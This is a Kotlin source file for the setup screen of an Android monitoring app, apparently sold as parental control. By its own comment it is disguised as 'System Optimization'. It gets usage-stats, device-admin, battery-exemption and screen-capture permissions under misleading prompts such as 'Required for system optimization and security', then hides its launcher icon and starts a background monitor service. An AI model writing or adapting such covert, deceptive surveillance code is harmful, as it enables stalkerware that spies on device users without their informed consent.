package com.parentalcontrol.kidmonitor

import android.app.Activity
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest
import java.util.UUID

/**
 * One-time setup screen. Disguised as "System Optimization".
 * After all permissions are granted, it:
 *  1. Generates a unique pairing key for this device (if not already set)
 *  2. Shows the pairing key so the parent can enter it in the Parent app
 *  3. Hides the launcher icon
 *  4. Starts MonitorService
 *  5. Finishes itself
 */
class SetupActivity : AppCompatActivity() {

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private lateinit var btnAction: Button
    private lateinit var tvStatus: TextView
    private lateinit var progressBar: ProgressBar

    private val prefs by lazy { getSharedPreferences(PREFS_NAME, MODE_PRIVATE) }

    // ─── Permission Launchers ─────────────────────────────────────────
    private val notifPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { nextStep() }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            // Save projection result for service
            prefs.edit()
                .putInt(KEY_PROJ_RESULT_CODE, result.resultCode)
                .putBoolean(KEY_SETUP_DONE, true)
                .apply()

            // Start monitor service with projection data
            MonitorService.startWithProjection(this, result.resultCode, result.data!!)
            finishSetup()
        } else {
            tvStatus.text = "Screen permission required. Tap to retry."
            btnAction.text = "Grant Permission"
            btnAction.setOnClickListener { requestScreenCapture() }
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    private val usagePermLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    private val batteryOptLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    // ─── Lifecycle ────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Ensure pairing key exists (generate once, never regenerate)
        ensurePairingKey()

        // If already setup and service is running, just finish
        if (prefs.getBoolean(KEY_SETUP_DONE, false)) {
            ensureServiceRunning()
            finish()
            return
        }

        setContentView(R.layout.activity_setup)
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        btnAction = findViewById(R.id.btnAction)
        tvStatus = findViewById(R.id.tvStatus)
        progressBar = findViewById(R.id.progressBar)

        btnAction.setOnClickListener { nextStep() }
        nextStep()
    }

    // ─── Pairing Key ──────────────────────────────────────────────────
    private fun ensurePairingKey() {
        if (prefs.getString(KEY_PAIRING_KEY, null) == null) {
            // Generate a random 8-character uppercase alphanumeric key
            val key = UUID.randomUUID().toString()
                .replace("-", "")
                .take(8)
                .uppercase()
            prefs.edit().putString(KEY_PAIRING_KEY, key).apply()
        }
    }

    // ─── Step machine ─────────────────────────────────────────────────
    private fun nextStep() {
        when {
            !hasNotificationPermission() -> requestNotifPermission()
            !hasUsageStatsPermission()   -> requestUsageStats()
            !isDeviceAdminActive()       -> requestDeviceAdmin()
            !isBatteryOptIgnored()       -> requestBatteryOptimization()
            else                         -> requestScreenCapture()
        }
    }

    // Notification permission (Android 13+)
    private fun hasNotificationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) ==
                    PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestNotifPermission() {
        setStatus("Requesting notification access...", 20)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            notifPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    // Usage stats permission
    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun requestUsageStats() {
        setStatus("Enabling app usage tracking...", 40)
        usagePermLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
    }

    // Device Admin
    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        return dpm.isAdminActive(adminComponent)
    }

    private fun requestDeviceAdmin() {
        setStatus("Enabling system protection...", 60)
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for system optimization and security.")
        }
        deviceAdminLauncher.launch(intent)
    }

    // Battery optimization
    private fun isBatteryOptIgnored(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        setStatus("Optimizing battery usage...", 75)
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:$packageName")
        }
        batteryOptLauncher.launch(intent)
    }

    // Screen capture (MediaProjection)
    private fun requestScreenCapture() {
        setStatus("Enabling screen monitoring...", 90)
        screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
    }

    // ─── Finish Setup ─────────────────────────────────────────────────
    private fun finishSetup() {
        setStatus("Setup complete! Optimizing...", 100)
        progressBar.visibility = View.INVISIBLE
        btnAction.visibility = View.GONE

        // Hide app icon from launcher
        hideAppIcon()

        // Show pairing key dialog after a short delay
        btnAction.postDelayed({ showPairingKeyDialog() }, 800)
    }

    private fun showPairingKeyDialog() {
        val pairingKey = prefs.getString(KEY_PAIRING_KEY, "???") ?: "???"

        AlertDialog.Builder(this)
            .setTitle("📱 Device Pairing Key")
            .setMessage(
                "Your device pairing key is:\n\n" +
                "  $pairingKey\n\n" +
                "Enter this key in the Parent Monitor app to link this device.\n\n" +
                "Keep this key private — only share with trusted parents."
            )
            .setPositiveButton("Copy & Done") { _, _ ->
                val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                clipboard.setPrimaryClip(ClipData.newPlainText("Pairing Key", pairingKey))
                Toast.makeText(this, "✅ Key copied to clipboard", Toast.LENGTH_SHORT).show()
                finish()
            }
            .setNegativeButton("Done") { _, _ -> finish() }
            .setCancelable(false)
            .show()
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun ensureServiceRunning() {
        if (!MonitorService.isRunning) {
            // Need re-request for MediaProjection — show trampoline
            val intent = Intent(this, ProjectionRequestActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }

    private fun setStatus(msg: String, progress: Int) {
        tvStatus.text = msg
        progressBar.progress = progress
        btnAction.visibility = View.GONE
    }

    companion object {
        const val PREFS_NAME          = "monitor_prefs"
        const val KEY_SETUP_DONE      = "setup_done"
        const val KEY_PROJ_RESULT_CODE = "proj_result_code"
        const val KEY_DEVICE_ID       = "device_id"
        const val KEY_PAIRING_KEY     = "pairing_key"
    }
}
